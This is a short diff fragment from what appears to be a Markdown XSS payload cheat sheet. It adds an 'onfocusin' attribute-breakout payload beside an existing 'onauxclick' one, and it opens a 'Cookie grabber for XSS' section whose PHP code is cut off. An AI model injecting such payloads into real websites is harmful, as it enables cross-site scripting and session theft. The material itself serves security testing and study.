@@ -15,6 +15,12 @@ AuxClick
 "><input onauxclick=alert(document.domain)>
 ```
 
+onfocusing
+
+```
+"><a id=x tabindex=1 onfocusin=alert(1)>Click ME NOW</a>
+```
+
 ## Cookie grabber for XSS
 ```
 <?php
